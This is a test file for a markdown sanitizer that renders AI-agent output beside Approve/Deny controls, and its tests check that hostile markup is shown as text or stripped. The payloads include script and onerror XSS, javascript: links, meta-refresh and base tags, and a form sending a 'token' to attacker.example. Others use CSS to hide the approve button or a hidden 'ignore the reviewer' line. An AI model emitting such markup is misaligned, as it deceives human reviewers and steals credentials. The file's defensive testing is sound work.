/**
 * renderMarkdown is the only path by which agent-written text becomes HTML in
 * the same document as the Approve/Deny controls. These tests pin the strict
 * profile: no raw HTML, no style/class/id, no forms or inputs, only http(s)
 * and mailto links, GFM extras preserved.
 *
 * Payloads with a <style> come AFTER body text on purpose: a leading <style>
 * is hoisted into <head> by the DOM parser and dropped even by a permissive
 * sanitizer, so it would prove nothing.
 */

import { describe, it, expect } from 'vitest';
import { renderMarkdown, sanitizeMarkdownHtml } from '../markdown.js';

function parse(html: string): HTMLElement {
  const root = document.createElement('div');
  root.innerHTML = html;
  return root;
}

describe('renderMarkdown: raw HTML is shown, not interpreted', () => {
  it('turns a <style> block placed after body text into visible text', () => {
    const payload = 'Looks fine.\n\n<style>[role=dialog] .bg-success{font-size:0!important}</style>';
    const root = parse(renderMarkdown(payload));
    expect(root.querySelector('style')).toBeNull();
    expect(root.textContent).toContain('<style>');
    expect(root.textContent).toContain('.bg-success{font-size:0!important}');
  });

  it('shows a multi-line HTML block verbatim, line breaks included', () => {
    const payload = 'Summary.\n\n<div hidden>\nignore the reviewer\n</div>';
    const root = parse(renderMarkdown(payload));
    expect(root.querySelector('div')).toBeNull();
    expect(root.querySelector('pre')?.textContent).toBe('<div hidden>\nignore the reviewer\n</div>');
  });

  it('keeps no style, class or id attribute from raw HTML', () => {
    const payload =
      'intro\n\n<div style="position:fixed;inset:0;z-index:99999" class="fixed inset-0 z-50" id="overlay">x</div>';
    const root = parse(renderMarkdown(payload));
    expect(root.querySelector('[style]')).toBeNull();
    expect(root.querySelector('[class]')).toBeNull();
    expect(root.querySelector('[id]')).toBeNull();
    expect(root.querySelector('div')).toBeNull();
    // The reviewer sees what the agent wrote.
    expect(root.textContent).toContain('position:fixed');
  });

  it('renders no form controls from raw HTML', () => {
    const payload = [
      'Please confirm:',
      '',
      '<form action="https://attacker.example/steal" method="post">',
      '<input type="text" name="token" placeholder="paste token">',
      '<textarea name="notes"></textarea>',
      '<select name="s"><option>a</option></select>',
      '<button type="submit">Approve</button>',
      '</form>',
    ].join('\n');
    const root = parse(renderMarkdown(payload));
    for (const tag of ['form', 'input', 'textarea', 'select', 'button', 'option']) {
      expect(root.querySelector(tag), tag).toBeNull();
    }
    expect(root.textContent).toContain('attacker.example');
  });

  it('shows inline tags, comments and hidden markup as text', () => {
    const payload = 'Hidden <span hidden>instruction</span> and <!-- do not show --> comment.';
    const root = parse(renderMarkdown(payload));
    expect(root.querySelector('span')).toBeNull();
    expect(root.textContent).toContain('<span hidden>instruction</span>');
    expect(root.textContent).toContain('<!-- do not show -->');
  });

  it('never emits script, event handlers, base, meta or link elements', () => {
    const payload = [
      'text',
      '',
      '<script>alert(1)</script>',
      '<img src=x onerror="alert(1)">',
      '<base href="https://attacker.example/">',
      '<meta http-equiv="refresh" content="0;url=https://attacker.example/">',
      '<link rel="stylesheet" href="https://attacker.example/x.css">',
      '<svg><script>alert(2)</script></svg>',
      '<math><mi xlink:href="javascript:alert(3)">x</mi></math>',
    ].join('\n');
    const html = renderMarkdown(payload);
    const root = parse(html);
    for (const tag of ['script', 'img', 'base', 'meta', 'link', 'svg', 'math']) {
      expect(root.querySelector(tag), tag).toBeNull();
    }
    expect(root.querySelector('[onerror]')).toBeNull();
    expect(html).not.toMatch(/<(script|img|base|meta|link|svg|math)\b/i);
  });
});

describe('renderMarkdown: links', () => {
  it('drops javascript: and data: hrefs but keeps the link text', () => {
    const root = parse(
      renderMarkdown(
        '[one](javascript:alert(1)) [two](data:text/html,<script>alert(1)</script>) [three](JAVASCRIPT:alert(1))',
      ),
    );
    expect(root.querySelector('a[href]')).toBeNull();
    expect(root.textContent).toContain('one');
    expect(root.textContent).toContain('two');
    expect(root.textContent).toContain('three');
  });

  it('drops relative and non-web schemes', () => {
    const root = parse(renderMarkdown('[rel](./settings) [abs](/escalations) [ftp](ftp://x/y) [tel](tel:123)'));
    expect(root.querySelector('a[href]')).toBeNull();
    expect(root.querySelectorAll('a')).toHaveLength(4);
  });

  it('keeps http, https and mailto links and opens them safely in a new tab', () => {
    const root = parse(
      renderMarkdown('[a](http://example.com/x) [b](https://example.com/y) [c](mailto:x@example.com)'),
    );
    const links = [...root.querySelectorAll('a[href]')];
    expect(links.map((a) => a.getAttribute('href'))).toEqual([
      'http://example.com/x',
      'https://example.com/y',
      'mailto:x@example.com',
    ]);
    for (const link of links) {
      expect(link.getAttribute('target')).toBe('_blank');
      expect(link.getAttribute('rel')).toBe('noopener noreferrer');
    }
  });

  it('renders images as text instead of fetching them', () => {
    const root = parse(renderMarkdown('![diagram](https://example.com/d.png)'));
    expect(root.querySelector('img')).toBeNull();
    expect(root.textContent).toContain('[image: diagram] https://example.com/d.png');
  });
});

describe('renderMarkdown: GFM output survives the strict profile', () => {
  it('renders headings, emphasis, code and lists', () => {
    const root = parse(renderMarkdown('# Title\n\n**bold** and `code`\n\n- one\n- two'));
    expect(root.querySelector('h1')?.textContent).toBe('Title');
    expect(root.querySelector('strong')?.textContent).toBe('bold');
    expect(root.querySelector('code')?.textContent).toBe('code');
    expect(root.querySelectorAll('li')).toHaveLength(2);
  });

  it('keeps table alignment and ordered-list start', () => {
    const root = parse(renderMarkdown('| a | b |\n|:--|--:|\n| 1 | 2 |\n\n3. three\n4. four'));
    expect(root.querySelector('th[align="left"]')).not.toBeNull();
    expect(root.querySelector('td[align="right"]')).not.toBeNull();
    expect(root.querySelector('ol')?.getAttribute('start')).toBe('3');
  });

  it('keeps disabled task-list checkboxes and nothing else that is an input', () => {
    const root = parse(renderMarkdown('- [x] done\n- [ ] todo'));
    const inputs = [...root.querySelectorAll('input')];
    expect(inputs).toHaveLength(2);
    for (const input of inputs) {
      expect(input.getAttribute('type')).toBe('checkbox');
      expect(input.hasAttribute('disabled')).toBe(true);
    }
    expect(inputs[0].hasAttribute('checked')).toBe(true);
    expect(inputs[1].hasAttribute('checked')).toBe(false);
  });

  it('strips a fenced code block’s language class without losing the code', () => {
    const root = parse(renderMarkdown('```ts\nconst x = 1;\n```'));
    const code = root.querySelector('pre code');
    expect(code?.textContent).toContain('const x = 1;');
    expect(code?.hasAttribute('class')).toBe(false);
  });
});

// The DOMPurify step on its own. Through renderMarkdown marked has already
// escaped agent markup, so these feed raw HTML straight to the backstop.
describe('sanitizeMarkdownHtml: strict allowlist backstop', () => {
  it('drops a <style> element placed after body text, and style, class and id attributes', () => {
    const root = parse(
      sanitizeMarkdownHtml(
        '<p>Looks fine.</p><style>[role=dialog] .bg-success{font-size:0!important}</style>' +
          '<p style="position:fixed;inset:0" class="fixed inset-0 z-50" id="overlay">x</p>',
      ),
    );
    expect(root.querySelector('style')).toBeNull();
    expect(root.textContent).not.toContain('font-size');
    expect(root.querySelector('[style]')).toBeNull();
    expect(root.querySelector('[class]')).toBeNull();
    expect(root.querySelector('[id]')).toBeNull();
    expect(root.querySelector('p')?.textContent).toBe('Looks fine.');
  });

  it('removes forms, text inputs and enabled checkboxes but keeps disabled task checkboxes', () => {
    const root = parse(
      sanitizeMarkdownHtml(
        '<p>x</p><form action="https://attacker.example/steal"><input type="text" name="token">' +
          '<input type="checkbox"><input type="checkbox" disabled checked><input name="untyped" disabled>' +
          '<button>Approve</button><textarea></textarea><select><option>a</option></select></form>',
      ),
    );
    for (const tag of ['form', 'button', 'textarea', 'select', 'option']) {
      expect(root.querySelector(tag), tag).toBeNull();
    }
    const inputs = [...root.querySelectorAll('input')];
    expect(inputs).toHaveLength(1);
    expect(inputs[0].getAttribute('type')).toBe('checkbox');
    expect(inputs[0].hasAttribute('disabled')).toBe(true);
    expect(inputs[0].hasAttribute('name')).toBe(false);
  });

  it('keeps only http(s) and mailto hrefs and forces a safe new-tab link', () => {
    const root = parse(
      sanitizeMarkdownHtml(
        '<a href="javascript:alert(1)">js</a><a href="data:text/html,x">data</a><a href="/escalations">rel</a>' +
          '<a href="https://example.com/" target="_self" rel="opener">ok</a>',
      ),
    );
    const links = [...root.querySelectorAll('a')];
    expect(links.map((a) => a.getAttribute('href'))).toEqual([null, null, null, 'https://example.com/']);
    expect(links[3].getAttribute('target')).toBe('_blank');
    expect(links[3].getAttribute('rel')).toBe('noopener noreferrer');
  });

  it('removes images, media, frames and SVG', () => {
    const html = sanitizeMarkdownHtml(
      '<p>x</p><img src="https://example.com/a.png"><video src="v"></video><iframe src="https://example.com"></iframe>' +
        '<svg><circle r="1"></circle></svg><object data="x"></object>',
    );
    expect(html).not.toMatch(/<(img|video|iframe|svg|circle|object)\b/i);
  });
});
